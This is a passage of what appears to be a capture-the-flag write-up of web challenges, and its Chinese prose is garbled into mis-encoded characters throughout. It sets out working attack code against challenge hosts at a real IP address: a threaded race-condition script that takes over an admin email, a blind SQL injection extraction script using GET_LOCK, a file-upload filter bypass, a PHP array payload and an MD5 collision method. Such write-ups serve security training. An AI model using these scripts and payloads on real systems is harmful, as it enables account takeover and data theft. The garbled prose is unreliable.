´å£ï¼Œä½†æ˜¯è·Ÿæµç¨‹çš„æ—¶å€™ï¼Œå‘ç°æ³¨å†Œç”¨æˆ·æœ‰åˆ‡æ¢ç”¨æˆ·åŠŸèƒ½ï¼Œçœ‹ä¸€ä¸‹åˆ‡æ¢ç”¨æˆ·é€»è¾‘æ€ä¹ˆåšçš„ï¼š</p><p>switch.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$users = zUserFile::get_relate_users($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($username != <span class="keyword">false</span> &amp;&amp; zUserFile::is_exists($username))&#123;</span><br><span class="line">$to_user = zUserFile::get_attrs($username);</span><br><span class="line">    <span class="comment">// å½“å‰ç”¨æˆ·å’Œç›®æ ‡ç”¨æˆ·ä»¥é€šè¿‡é‚®ç®±éªŒè¯ï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·é‚®ç®±ä¸ç›®æ ‡ç”¨æˆ·é‚®ç®±ä¸€è‡´</span></span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $to_user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $user[<span class="string">'email'</span>] === $to_user[<span class="string">'email'</span>])&#123;</span><br><span class="line">$userObj-&gt;login2($username);</span><br><span class="line">header(<span class="string">'Location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$username = trim($username);</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜è½¬åŒ–ä¸ºæŠŠè‡ªå·±é‚®ç®±å¼„æˆadminé‚®ç®±ï¼Œç»§ç»­å®¡è®¡ç»‘å®šé‚®ç®±è¿‡ç¨‹ï¼ˆchgemail.phpã€class.user.phpï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(!chktoken())&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID REQUEST'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>])?trim($_POST[<span class="string">'email'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;chg_email($_SESSION[<span class="string">'username'</span>], $email))<span class="comment">//ä¿®æ”¹ç»‘å®šé‚®ç®±</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'SUCCESS'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'FAILED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span><span class="params">($username, $email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($email == <span class="keyword">false</span> || !zUserFile::validate_email($email))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$old_email = $user[<span class="string">'email'</span>];</span><br><span class="line">$emails = zUserFile::get_emails();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($emails[$old_email]))&#123;</span><br><span class="line">$emails[$old_email] = array_diff($emails[$old_email], <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">if</span>($emails[$old_email] == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>($emails[$old_email]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// é‡ç»‘å®šé‚®ç®±åï¼Œemail_verifyè¢«é‡ç½®, tokenè¢«é‡ç½®</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">0</span>);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email'</span>, $email);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">$us = @is_array($emails[$email])?$emails[$email]:<span class="keyword">array</span>();</span><br><span class="line">$emails[$email] = array_merge($us, <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">return</span> zUserFile::update_emails($emails);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($email) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> filter_var($email, FILTER_VALIDATE_EMAIL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´é‡æ–°ç»‘å®šé‚®ç®±æ—¶ï¼Œéœ€è¦é‡æ–°å‘é‚®ä»¶ï¼Œç„¶åéªŒè¯ï¼Œå†çœ‹ä¸‹éªŒè¯éƒ¨åˆ†ä»£ç ï¼ˆverify.phpï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$token = <span class="keyword">isset</span>($_GET[<span class="string">'token'</span>])?trim($_GET[<span class="string">'token'</span>]):<span class="string">''</span>;</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;\</span><br><span class="line">    <span class="comment">// tokenå’Œusernameä¸ä¸ºç©º</span></span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span> || $username == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID INPUT'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;verify_email($username, $token))&#123;</span><br><span class="line">$userObj-&gt;login($username);</span><br><span class="line">header(<span class="string">'location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID TOKEN OR USERNAME'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php::zUser::verify_email</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span><span class="params">($username, $token)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$token = trim($token);</span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$real_token = $user[<span class="string">"token"</span>];</span><br><span class="line">        <span class="comment">// éªŒè¯æäº¤çš„tokenæ˜¯å¦å’Œæ•°æ®åº“é‡Œçš„ç”¨æˆ·å¯¹åº”çš„tokenä¸€è‡´</span></span><br><span class="line"><span class="keyword">if</span>(md5($real_token) !== md5($token))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// tokenè¢«é‡ç½®</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// Condition Race</span></span><br><span class="line">        <span class="comment">// verifyè®¾ä¸º1</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><p>å®¡åˆ°è¿™é‡Œæƒ³åˆ°æ¡ä»¶ç«äº‰ï¼Œå¦‚æœèµ°æ­£å¸¸é‡ç½®é‚®ç®±çš„æµç¨‹ï¼Œç¨‹åºæ‰§è¡Œåˆ°<code>zUserFile::update_attr($username, &#39;token&#39;, &#39;&#39;);</code>æ—¶ï¼Œå†æ¬¡è¯·æ±‚é‡ç½®é‚®ç®±ï¼Œç”±äºclass.user.php::validate_email()æ²¡æœ‰æ£€æŸ¥validçŠ¶æ€ï¼Œå¯¼è‡´æ–°çš„emailè¢«å†™å…¥ï¼Œç¨‹åºå†å›åˆ°<code>zUserFile::update_attr($username, &#39;email_verify&#39;, 1);</code>ï¼Œé‚£ä¹ˆæ”»å‡»è¿™å°±å¯ä»¥é‡ç½®ä»»æ„é‚®ç®±äº†ã€‚</p><p>æ¢³ç†ä¸€ä¸‹æ€è·¯ï¼Œä¹Ÿå°±æ˜¯ï¼š</p><ol><li>æ³¨å†Œç”¨æˆ·éªŒè¯é‚®ç®±</li><li>é‡ç½®é‚®ç®±ï¼ˆè¿™é‡Œé‚®ç®±è¿˜å†™è‡ªå·±çš„ï¼‰</li><li>æ”¶åˆ°æ ¡éªŒé“¾æ¥</li><li>åœ¨è¯·æ±‚æ ¡éªŒé“¾æ¥åŒæ—¶ï¼Œå†æ¬¡é‡ç½®é‚®ç®±ä¸ºç®¡ç†å‘˜é‚®ç®±ï¼ˆambulong@vulnspy.comï¼Œæ³¨å†Œç•Œé¢å‡ºç°è¿‡ï¼‰ï¼Œè‹¥è¯¥æ­¥éª¤åœ¨æ¯”è¾ƒtokenä¸€è‡´â€”-&gt;set(email_verify=1)ä¸­é—´æ‰§è¡Œï¼Œåˆ™æ¡ä»¶ç«äº‰æˆåŠŸã€‚</li></ol><p>å› æ­¤æœ‰ä»¥ä¸‹PoCï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">HOST = <span class="string">"http://114.55.36.69:8023"</span></span><br><span class="line">VERIFY_URL = <span class="string">"/verify.php?token=7lGBgYOtvxoW7mRHdsGEFJqr6YMDIJjD&amp;username=admin1"</span></span><br><span class="line">SESSION=<span class="string">"h5evpbu7eclfe0kpfe3fad01q1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_verify</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(HOST + VERIFY_URL)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_email</span><span class="params">()</span>:</span></span><br><span class="line">    burp0_url = HOST + <span class="string">"/chgemail.php?token=JaX1dpl3"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: SESSION&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"email"</span>: <span class="string">"ambulong@vulnspy.com"</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">    res=requests.post(</span><br><span class="line">        burp0_url,</span><br><span class="line">        cookies=burp0_cookies,</span><br><span class="line">        data=burp0_data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = threading.Thread(target=send_verify, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    poc()</span><br></pre></td></tr></table></figure><p>è¿è¡Œåçœ‹åˆ°é‚®ç®±è¢«ä¿®æ”¹ï¼Œåˆ‡æ¢ç”¨æˆ·å°±èƒ½æ‹¿åˆ°flagäº†</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571219028911.png" alt="1571219028911"></p><h1 id="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"><a href="#å¥‡æ€ªçš„æé¾™ç‰¹æ€§" class="headerlink" title="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"></a>å¥‡æ€ªçš„æé¾™ç‰¹æ€§</h1><p>PHPç‰¹æ€§ï¼Œ</p><ol><li><p>å‚æ•°åä¸ºA.Aä¼šè½¬å˜ä¸ºA_Aï¼Œ</p></li><li><p>æ•°ç»„&gt;inf</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571196679531.png" alt="1571196679531"></p></li><li><p>æ•°ç»„è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶ä¼šå‡ºé”™ï¼Œå› æ­¤ç»“æœ==0</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571196848622.png" alt="1571196848622"></p></li></ol><p>å› æ­¤æœ‰payloadï¼š<code>/?A.A[]=1</code></p><h1 id="æ–°ç“¶è£…æ—§é…’"><a href="#æ–°ç“¶è£…æ—§é…’" class="headerlink" title="æ–°ç“¶è£…æ—§é…’"></a>æ–°ç“¶è£…æ—§é…’</h1><p>73-81è¡Œéœ€è¦ä¼ ä¸€ä¸ªåˆæ³•zipæ–‡ä»¶ï¼Œæ— æ³•ç»•è¿‡ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571211251759.png" alt="1571211251759"></p><p>æ¥ç€ï¼Œ92-105è¡Œè§£å‹zipï¼Œå¹¶ä¸”ç§»åŠ¨åˆ°uploadç›®å½•ä¸‹ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571211484309.png" alt="1571211484309"></p><p>è¦æ±‚zipä¸­å­˜åœ¨å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸åŒ…å«â€.phâ€å­—ç¬¦ï¼Œå¯ä»¥é€šè¿‡â€x.pHp.jpgâ€ç»•è¿‡ï¼Œä¸Šä¼ æˆåŠŸï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571211770075.png" alt="1571211770075"></p><h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>æ•æ„Ÿè·¯å¾„æ‰«æï¼Œå‘ç°<code>/robots.txt</code>æ³„éœ²ï¼Œæ‰“å¼€å‘ç°æç¤º</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571199573631.png" alt="1571199573631"></p><p>ä»¥åŠæ³¨å…¥ç‚¹ <code>/article.php?id=2</code></p><p>è·‘é»‘åå•ï¼Œå‘ç°selectã€sleepå’Œbenchmarkéƒ½bannedï¼Œè§£æ³•æ˜¯é€šè¿‡GET_LOCK</p><blockquote><p>GET_LOCK(str,timeout)<br>Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.</p></blockquote><p>å› æ­¤å°è¯•<code>/article.php?id=2&#39; and (get_lock(&#39;vvvv&#39;,10)) #</code>å¯ä»¥æˆåŠŸå»¶æ—¶ï¼Œæ³¨æ„åˆ°åŒè¡¨åšåˆ—æŸ¥è¯¢æ—¶ä¸éœ€è¦ç”¨selectï¼Œå› æ­¤æœ‰å¦‚ä¸‹è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleepcms</span><span class="params">()</span>:</span></span><br><span class="line">    base_url = <span class="string">"http://114.55.36.69:8007/article.php?id="</span></span><br><span class="line">    dic = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    cur = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"1'/**/and/**/(if(substr(content,&#123;pos&#125;,1)='&#123;char&#125;',get_lock('nonce',3),0))/**/#"</span></span><br><span class="line">            url = base_url+urllib.parse.quote(payload.format(pos=cur,char=i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += str(i)</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sleepcms()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flagï¼š<code>flagis{Flag{C221e22A28b933f103f0f88caB68b79b}}</code>ï¼Œæ”¹æˆå°å†™æäº¤æœ€é‡Œé¢æ‹¬å·çš„å†…å®¹</p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>è¦æ±‚<code>$_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])</code>ï¼Œå¼ºç½‘æ¯åŸé¢˜ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">å¦‚ä½•ç”¨ä¸åŒçš„æ•°å€¼æ„å»ºä¸€æ ·çš„MD5</a>ã€‚</p><p>æŒ‡å®šparam1å’Œparam2ç›¸åŒçš„å¼€å¤´ï¼Œè¿™é‡Œä»¥â€1â€ä¸ºä¾‹:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;init.txt</span><br></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨fastcollç”Ÿæˆå…·æœ‰ç›¸åŒmd5çš„æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Î» fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: <span class="string">'1.txt'</span> and <span class="string">'2.txt'</span></span><br><span class="line">Using prefixfile: <span class="string">'init.txt'</span></span><br><span class="line">Using initial value: b012cf77f9677e37eea923017fc5e83e</span><br><span class="line"></span><br><span class="line">Generating first block: ..</span><br><span class="line">Generating second block: S00....</span><br><span class="line">Running time: 0.641 s</span><br></pre></td></tr></table></figure><p>å°†1.txtå’Œ2.txtå†…å®¹è¿›è¡Œç¼–ç åå‘é€å³å¯çš„å¾—åˆ°flagã€‚</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571140925389.png" alt="1571140925389"></p><p>æä¾›ä»£ç æ–¹ä¾¿å¤ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $text1=$_POST["data1"];</span></span><br><span class="line"><span class="comment">// $text2=$_POST["data2"];</span></span><br><span class="line"></span><br><span class="line">$text1=readmyfile(<span class="string">"1.txt"</span>);</span><br><span class="line">$text2=readmyfile(<span class="string">"2.txt"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD51: '</span>. md5($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode ($text1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD52: '</span>.md5($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode($text2));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ç®€å•çš„md5"><a href="#ç®€å•çš„md5" class="headerlink" title="ç®€å•çš„md5"></a>ç®€å•çš„md5</h1><p>è®¿é—®ç½‘ç«™æºä»£ç ï¼Œçœ‹åˆ°æç¤ºï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571131147272.png" alt="1571131147272"></p><p>å®é™…ä¸Šæ˜¯è¯´ï¼Œ<code>md5($_POST[&#39;data1&#39;])!=md5($_POST[&#39;data2&#39;])</code>ï¼Œç”±äºæ²¡ç”¨å…¨ç­‰ï¼Œç”¨<code>0e</code>ç»•è¿‡å³å¯ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571131226817.png" alt="1571131226817"></p><h1 id="ç§˜å¯†çš„ç³»ç»Ÿ"><a href="#ç§˜å¯†çš„ç³»ç»Ÿ" class="headerlink" title="ç§˜å¯†çš„ç³»ç»Ÿ"></a>ç§˜å¯†çš„ç³»ç»Ÿ</h1><h2 id="0x01-ä¿¡æ¯æ³„éœ²"><a href="#0x01-ä¿¡æ¯æ³„éœ²" class="headerlink" title="0x01 ä¿¡æ¯æ³„éœ²"></a>0x01 ä¿¡æ¯æ³„éœ²</h2><p>é¦–å…ˆï¼Œdirsearchå‘ç°æ³„éœ².idea/workspace.xmlæ–‡ä»¶ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571192815365.png" alt="1571192815365"></p><p>workspaceå‘ç°æ›´å¤šçš„æ–‡ä»¶ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571192935874.png" alt="1571192935874"></p><p>phpæ–‡ä»¶æœªå¿…èƒ½è®¿é—®ï¼Œçœ‹<code>/web/robots.txt</code>:</p><p><img 